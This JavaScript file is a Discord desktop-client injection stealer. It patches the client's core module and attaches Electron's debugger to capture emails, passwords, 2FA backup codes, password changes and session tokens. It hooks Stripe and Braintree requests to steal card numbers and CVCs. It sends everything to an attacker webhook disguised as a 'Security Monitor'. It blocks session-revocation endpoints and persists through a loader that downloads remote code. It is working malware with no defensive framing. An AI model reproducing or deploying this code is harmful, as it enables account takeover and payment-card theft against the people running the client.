const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

// ============================================================
// Configuration
// ============================================================
const CFG = {
    wh: "%WEBHOOK%",
    // NOTE: Replace this URL with your own GitHub raw URL
    src: "https://raw.githubusercontent.com/SENIN_KULLANICI_ADIN/injection/main/injection_obf.js",
    ep: [
        "/auth/login",
        "/auth/register",
        "/mfa/totp",
        "/mfa/codes-verification",
        "/users/@me",
    ],
    ws: [
        "wss://remote-auth-gateway.discord.gg/*",
        "https://discord.com/api/v*/auth/sessions",
        "https://*.discord.com/api/v*/auth/sessions",
        "https://discordapp.com/api/v*/auth/sessions"
    ],
    pmt: [
        "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
        "https://api.stripe.com/v*/tokens",
    ],
    api: "https://discord.com/api/v9/users/@me",
    tags: {
        Discord_Emloyee: { Value: 1, Emoji: "<:8485discordemployee:1163172252989259898>", Rare: true },
        Partnered_Server_Owner: { Value: 2, Emoji: "<:9928discordpartnerbadge:1163172304155586570>", Rare: true },
        HypeSquad_Events: { Value: 4, Emoji: "<:9171hypesquadevents:1163172248140660839>", Rare: true },
        Bug_Hunter_Level_1: { Value: 8, Emoji: "<:4744bughunterbadgediscord:1163172239970140383>", Rare: true },
        Early_Supporter: { Value: 512, Emoji: "<:5053earlysupporter:1163172241996005416>", Rare: true },
        Bug_Hunter_Level_2: { Value: 16384, Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>", Rare: true },
        Early_Verified_Bot_Developer: { Value: 131072, Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>", Rare: true },
        House_Bravery: { Value: 64, Emoji: "<:6601hypesquadbravery:1163172246492287017>", Rare: false },
        House_Brilliance: { Value: 128, Emoji: "<:6936hypesquadbrilliance:1163172244474822746>", Rare: false },
        House_Balance: { Value: 256, Emoji: "<:5242hypesquadbalance:1163172243417858128>", Rare: false },
        Active_Developer: { Value: 4194304, Emoji: "<:1207iconactivedeveloper:1163172534443851868>", Rare: false },
        Certified_Moderator: { Value: 262144, Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>", Rare: true },
        Spammer: { Value: 1048704, Emoji: "⌨️", Rare: false },
    },
};

// ============================================================
// Utility helpers
// ============================================================
const execJS = script => {
    const w = BrowserWindow.getAllWindows()[0];
    return w.webContents.executeJavaScript(script, !0);
};

const flushLocal = () => {
    execJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    execJS("location.reload()");
};

const readSession = async () => await execJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const netReq = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: { "Access-Control-Allow-Origin": "*" },
    };
    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

// ============================================================
// Data collection helpers
// ============================================================
const getPlan = flags => {
    switch (flags) {
        case 1: return '`Nitro Classic`';
        case 2: return '`Nitro Boost`';
        case 3: return '`Nitro Basic`';
        default: return '`❌`';
    }
};

const getTags = flags => {
    let tags = '';
    for (const tag in CFG.tags) {
        let b = CFG.tags[tag];
        if ((flags & b.Value) == b.Value) tags += b.Emoji + ' ';
    }
    return tags || '`❌`';
};

const getRareTags = flags => {
    let tags = '';
    for (const tag in CFG.tags) {
        let b = CFG.tags[tag];
        if ((flags & b.Value) == b.Value && b.Rare) tags += b.Emoji + ' ';
    }
    return tags;
};

const fetchInfo = async (endpoint, headers) => {
    return JSON.parse(await netReq("GET", CFG.api + endpoint, headers));
};

const readProfile = async token => await fetchInfo("", { "Authorization": token });
const readBilling = async token => await fetchInfo("/billing/payment-sources", { "Authorization": token });
const readServers = async token => await fetchInfo("/guilds?with_counts=true", { "Authorization": token });
const readFriends = async token => await fetchInfo("/relationships", { "Authorization": token });

const getPayment = async token => {
    const data = await readBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1: billing += '💳 '; break;
                case 2: billing += '<:paypal:1148653305376034967> '; break;
            }
        }
    });
    return billing || '`❌`';
};

const getContacts = async token => {
    const friends = await readFriends(token);
    const filteredFriends = friends.filter((user) => user.type == 1);
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var tags = getRareTags(acc.user.public_flags);
        if (tags != "") {
            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
            rareUsers += `${tags} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "**No Rare Friends**";
    return { message: rareUsers, totalFriends: friends.length };
};

const getGuilds = async token => {
    const guilds = await readServers(token);
    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") rareGuilds += `**Rare Servers:**\n`;
        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }
    rareGuilds = rareGuilds || "**No Rare Servers**";
    return { message: rareGuilds, totalGuilds: guilds.length };
};

// ============================================================
// Dispatch helpers
// ============================================================
const dispatch = async (payload, token, account) => {
    payload["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + payload["content"];
    payload["username"] = "Security Monitor";
    payload["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
    payload["embeds"][0]["author"] = { "name": account.username };
    payload["embeds"][0]["thumbnail"] = {
        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
    };
    payload["embeds"][0]["footer"] = {
        "text": "session audit",
        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
    };
    payload["embeds"][0]["title"] = "Account Information";

    const nitro = getPlan(account.premium_type);
    const tags = getTags(account.flags);
    const billing = await getPayment(token);
    const friends = await getContacts(token);
    const servers = await getGuilds(token);

    payload["embeds"][0]["fields"].push(
        { "name": "Token", "value": "```" + token + "```", "inline": false },
        { "name": "Nitro", "value": nitro, "inline": true },
        { "name": "Badges", "value": tags, "inline": true },
        { "name": "Billing", "value": billing, "inline": true }
    );

    payload["embeds"].push(
        { "title": `Total Friends: ${friends.totalFriends}`, "description": friends.message },
        { "title": `Total Servers: ${servers.totalGuilds}`, "description": servers.message }
    );

    for (const embed in payload["embeds"]) {
        payload["embeds"][embed]["color"] = 0xb143e3;
    }

    await netReq("POST", CFG.wh, { "Content-Type": "application/json" }, JSON.stringify(payload));
};

// ============================================================
// Event handlers
// ============================================================
const onAuthEvent = async (email, password, token, action) => {
    const account = await readProfile(token);
    const payload = {
        "content": `**${account.username}** just ${action}!`,
        "embeds": [{
            "fields": [
                { "name": "Email", "value": "`" + email + "`", "inline": true },
                { "name": "Password", "value": "`" + password + "`", "inline": true }
            ]
        }]
    };
    dispatch(payload, token, account);
};

const onCodesEvent = async (codes, token) => {
    const account = await readProfile(token);
    const filteredCodes = codes.filter((code) => code.consumed === false);
    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const payload = {
        "content": `**${account.username}** just viewed his 2FA backup codes!`,
        "embeds": [{
            "fields": [
                { "name": "Backup Codes", "value": "```" + message + "```", "inline": false },
                { "name": "Email", "value": "`" + account.email + "`", "inline": true },
                { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
            ]
        }]
    };
    dispatch(payload, token, account);
};

const onPassEvent = async (newPassword, oldPassword, token) => {
    const account = await readProfile(token);
    const payload = {
        "content": `**${account.username}** just changed his password!`,
        "embeds": [{
            "fields": [
                { "name": "New Password", "value": "`" + newPassword + "`", "inline": true },
                { "name": "Old Password", "value": "`" + oldPassword + "`", "inline": true }
            ]
        }]
    };
    dispatch(payload, token, account);
};

const onCardEvent = async (number, cvc, month, year, token) => {
    const account = await readProfile(token);
    const payload = {
        "content": `**${account.username}** just added a credit card!`,
        "embeds": [{
            "fields": [
                { "name": "Number", "value": "`" + number + "`", "inline": true },
                { "name": "CVC", "value": "`" + cvc + "`", "inline": true },
                { "name": "Expiration", "value": "`" + month + "/" + year + "`", "inline": true }
            ]
        }]
    };
    dispatch(payload, token, account);
};

const onPaypalEvent = async (token) => {
    const account = await readProfile(token);
    const payload = {
        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
        "embeds": [{
            "fields": [
                { "name": "Email", "value": "`" + account.email + "`", "inline": true },
                { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
            ]
        }]
    };
    dispatch(payload, token, account);
};

// ============================================================
// Injection bootstrapper
// ============================================================
const locatePaths = (function () {
    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return { resourcePath, app };
    return { undefined, undefined };
})();

async function bootstrap() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        fs.rmdirSync(path.join(__dirname, 'initiation'));
        const token = await readSession();
        if (!token) return;
        const account = await readProfile(token);
        const payload = {
            "content": `**${account.username}** just got injected!`,
            "embeds": [{
                "fields": [
                    { "name": "Email", "value": "`" + account.email + "`", "inline": true },
                    { "name": "Phone", "value": "`" + (account.phone || "None") + "`", "inline": true }
                ]
            }]
        };
        await dispatch(payload, token, account);
        flushLocal();
    }

    const { resourcePath, app } = locatePaths;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const pkgJson = path.join(appPath, 'package.json');
    const resIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0];
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(pkgJson)) fs.unlinkSync(pkgJson);
    if (fs.existsSync(resIndex)) fs.unlinkSync(resIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(pkgJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));

        const loaderScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size;
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      https.get('${CFG.src}', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.replace('%WEBHOOK%', '${CFG.wh}');
          res.pipe(file);
          file.on('finish', () => { file.close(); });
      }).on("error", (err) => { setTimeout(init(), 10000); });
  }
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resIndex, loaderScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let bootstrapped = false;

const setupDebugger = () => {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!bootstrapped) {
            await bootstrap();
            bootstrapped = true;
        }

        if (method !== 'Network.responseReceived') return;
        if (!CFG.ep.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
        const responseData = JSON.parse(responseUnparsedData.body);

        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
        const requestData = JSON.parse(requestUnparsedData.postData);

        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return;
                }
                onAuthEvent(requestData.login, requestData.password, responseData.token, "logged in");
                break;

            case params.response.url.endsWith('/register'):
                onAuthEvent(requestData.email, requestData.password, responseData.token, "signed up");
                break;

            case params.response.url.endsWith('/totp'):
                onAuthEvent(email, password, responseData.token, "logged in with 2FA");
                break;

            case params.response.url.endsWith('/codes-verification'):
                onCodesEvent(responseData.backup_codes, await readSession());
                break;

            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;
                if (requestData.email) {
                    onAuthEvent(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                }
                if (requestData.new_password) {
                    onPassEvent(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');
    mainWindow.on('closed', () => { setupDebugger(); });
};
setupDebugger();

session.defaultSession.webRequest.onCompleted(CFG.pmt, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            onCardEvent(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await readSession());
            break;
        case details.url.endsWith('paypal_accounts'):
            onPaypalEvent(await readSession());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CFG.ws, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) {
        return callback({ cancel: true });
    }
});

module.exports = require("./core.asar");